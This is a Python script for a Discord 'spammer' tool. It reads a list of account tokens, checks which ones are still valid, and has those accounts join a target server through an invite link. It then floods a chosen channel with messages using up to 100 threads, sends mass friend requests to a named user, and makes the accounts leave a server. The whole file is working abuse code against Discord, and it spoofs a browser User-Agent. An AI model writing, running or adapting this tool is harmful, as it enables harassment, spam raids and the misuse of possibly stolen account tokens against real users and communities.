import random
import discord
import asyncio
import sys
from discord.ext import commands
import requests
import os
import json
import threading
import time
from subprocess import call 
import ctypes
from time import sleep
from colorama import Fore,init
import sys
import threading
ui = "Hans spammer started:"
version= "1.1"
clear =  lambda: os.system("cls")
blue = Fore.BLUE
white = Fore.WHITE
red = Fore.WHITE
pink = Fore.MAGENTA
green = Fore.GREEN
black = Fore.BLACK
    

def leave_function():
    link = input(Fore.CYAN+f'[!] Discord Server Id: ')
    if len(link) > 0:
        apilink = f"https://discordapp.com/api/v7/users/@me/guilds/{link}"

        print(f"{Fore.CYAN}Bots leaving from:{Fore.WHITE} {link}")
        s = 0
        with open('in/tokens.txt','r') as handle:
            tokens = handle.readlines()
            for x in tokens:
                token = x.rstrip()
                headers={
                        "Authorization": token
                    }
                a = requests.delete(apilink, headers=headers)
                if "204" in a:
                    s+= 1
                else:
                    pass
            print (f"{Fore.WHITE}[{Fore.GREEN}{s}{Fore.WHITE}/{Fore.GREEN}{len(tokens)}{Fore.WHITE}] left from {link}!")
            time.sleep(1)
            input()
            sys.exit()
            exit()
    else:
        sys.exit()
        exit()
def token_checker():
    open("out/valid.txt", "a")
    open("out/invalid.txt", "a")
    check_link = "https://discordapp.com/api/v6/invite/pXdxXCC"
    s = 0
    b = 0
    with open('in/tokens.txt','r') as handle:
        tokens = handle.readlines()
        for x in tokens:
            token = x.strip()
            headers={
                'Authorization': token
            }
            a = requests.post(check_link, headers=headers)
            #with open("logs.txt", "a") as n:
            #    n.write(f"{a.json()}\n")
            if "You need to verify your account in order to perform this action." in a.text:
                print(f"{white}[{red}DEAD{white}] {red}{x}{white}".replace("\n", ""))
                with open("out/invalid.txt", "a") as m:
                    m.write(f"{x}")
                b += 1
            elif "Unauthorized" in a.text:
                print(f"{white}[{red}DEAD{white}] {red}{x}{white}".replace("\n", ""))
                with open("out/invalid.txt", "a") as m:
                    m.write(f"{x}")
                b += 1
            elif "Access denied" in a.text:
                print("You got banned kek")
                input()
                sys.exit()
                exit()
            else:
                s += 1
                print(f"{white}[{green}ALIVE{white}] {green}{x}{white}".replace("\n", ""))
                with open("out/valid.txt", "a") as m:
                    m.write(f"{x}")
            ctypes.windll.kernel32.SetConsoleTitleW(f"Token Checker | Valid: {s} Invalid: {b}")
        print (f"\n[!] Valid: {green}{s}{white} Invalid: {red}{b} {Fore.CYAN}Total: {len(tokens)}")
        input(">> Press Enter to exit")
        sys.exit()
        exit()            

def spammer():
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("Hans Spammer | v{}".format(version))
    init()
    print(ui)
    print()

    print(Fore.BLUE+f'[0]{Fore.YELLOW} Token checker (proxyless)')
    print(Fore.BLUE+f'[1]{Fore.WHITE} Join server')
    print(Fore.BLUE+f'[2]{Fore.WHITE} Spam server')
    print(Fore.BLUE+f'[3]{Fore.WHITE} Spam friend reuqest')
    #print(Fore.BLUE+f'[4]{Fore.WHITE} Dm spam')
    print(Fore.BLUE+f'[4]{Fore.WHITE} Server leave')

        


    init()
    print(Fore.CYAN + f'[!] Choose an option:{Fore.WHITE} ', end='')
    option = str(input())


    sent = 0
    joinedt = 0
    num = 0


    token1 = []
    def load_token1():
                with open('in/tokens.txt', 'r') as f:
                        for x in f.readlines():
                                token1.append(x.replace('\n',''))



    if option == "0":
        clear()
        threading.Thread(target=token_checker, args=()).start()
        return
    elif option =='1':
        link = input(Fore.CYAN+f'[!] Discord Invite Link(link):{Fore.WHITE} ')
        if len(link) > 6:
            link = link[19:]
            apilink = "https://discordapp.com/api/v6/invite/" + str(link)

            print(f"{Fore.CYAN}Adding bots to server:{Fore.WHITE} {link}")
            s = 0
            with open('in/tokens.txt','r') as handle:
                    tokens = handle.readlines()
                    for x in tokens:
                        token = x.rstrip()
                        headers={
                            'Authorization': token
                            }
                        a = requests.post(apilink, headers=headers)
                        if "You need to verify your account in order to perform this action." in a.text:
                            pass
                        else:
                            s+=1
                    print (f"{Fore.WHITE}[{Fore.GREEN}{s}{Fore.WHITE}/{Fore.GREEN}{len(tokens)}{Fore.WHITE}] are ready to spam!")
                    time.sleep(1)
            print("----------------------------------------")
            question=input(f"{Fore.CYAN}Want to proceed to message spammer?\n{Fore.BLUE}[1]{Fore.WHITE} YES\n{Fore.BLUE}[2]{Fore.WHITE} NO\n{Fore.BLUE}=>{Fore.WHITE} ")
            if question == "1":
                clear()
                print(ui)
                pass
            else:
                sys.exit()
                exit()
        else:
            sys.exit()
            exit()
            
    elif option =="2":
        pass
    elif option == "3":
        m = 0
        gay1 = input(Fore.BLUE+f'Discord name:{Fore.WHITE} ')
        message2 = input(Fore.BLUE+f'Discrim:{Fore.WHITE} ')
        with open('in/tokens.txt', 'r') as handle:
            token1 = handle.readlines()
        for x in token1:
            url = 'https://discordapp.com/api/v6/users/@me/relationships'
            headers1 = {  "Authorization":x.strip(),
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
                        "Content-Type":"application/json"}
            message = gay1
            POSTedJSON =  json.dumps ( {"username":message,"discriminator":message2} )
            
            requests.post(url, headers = headers1, data=POSTedJSON)
            m += 1
        print(Fore.GREEN+"Done!"+Fore.WHITE+f" {len(token1)} request(s) sent!")
        input(Fore.WHITE+"Press enter to exit")
        sys.exit()
        exit()
    
    elif option == "4":
        clear()
        threading.Thread(target=leave_function, args=()).start()
        return
    else:
        sys.exit()
        exit()

    #def options():
    channel_id =input(Fore.BLUE+f'Channel id:{Fore.WHITE} ')
    spam_message = input(Fore.BLUE+f'Message to spam:{Fore.WHITE} ')
    
    id1 = channel_id
    message_1 =spam_message


    646787420104294417


    def sender():
        for x in token1:
            baseURL = "https://discordapp.com/api/channels/{}/messages".format(id1)
            headers = {"Authorization": x,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
                    "Content-Type": "application/json", }
            message = message_1

            POSTedJSON = json.dumps({"content": message})

            r = requests.post(baseURL, headers=headers, data=POSTedJSON)


        load_token1()

        while True:
                if threading.active_count() < 100:
                        threading.Thread(target=sender, args=()).start()
                        time.sleep(0.25)

    sender()
spammer()
